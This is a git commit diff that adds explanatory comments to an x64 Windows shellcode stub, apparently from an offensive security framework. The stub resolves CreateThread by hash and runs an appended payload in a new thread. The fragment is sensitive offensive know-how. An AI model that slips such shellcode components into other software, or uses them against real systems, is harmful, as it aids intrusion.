4477e7775455b4cee0147d7e22925a7c97ba273d
zerosum0x0 <zerosum0x0@gmail.com>
2017-04-28 16:35:11 -0600

    add some better comments

--- external/source/shellcode/windows/x64/src/single/createthread.asm
+++ external/source/shellcode/windows/x64/src/single/createthread.asm
@@ -1,4 +1,10 @@
+;-----------------------------------------------------------------------------;
+; Author: Sean Dillon (@zerosum0x0)
+; Architecture: x64
+; Based on x86/single/createthread by Stephen Fewer
 ; Clobbers: RAX, RCX, RDX, R8, R9, R10, R11
+; Append payload to run in a separate thread to this stub.
+;-----------------------------------------------------------------------------;
 
 [BITS 64]
 [ORG 0]
@@ -17,8 +23,8 @@ start:
   push rcx                                    ; lpThreadId = NULL
   push rcx                                    ; dwCreationFlags = 0
   pop r9                                      ; lpParameter = NULL
-  lea r8, [rel threadstart]                   ; lpStartAddr = threadstart
-  pop rdx
+  lea r8, [rel threadstart]                   ; lpStartAddr = &threadstart
+  pop rdx                                     ; lpThreadAttributes = NULL
 
   mov r10d, 0x160D6838                        ; hash( "kernel32.dll", "CreateThread" )
   call rbp                                    ; CreateThread( NULL, 0, &threadstart, NULL, 0, NULL );
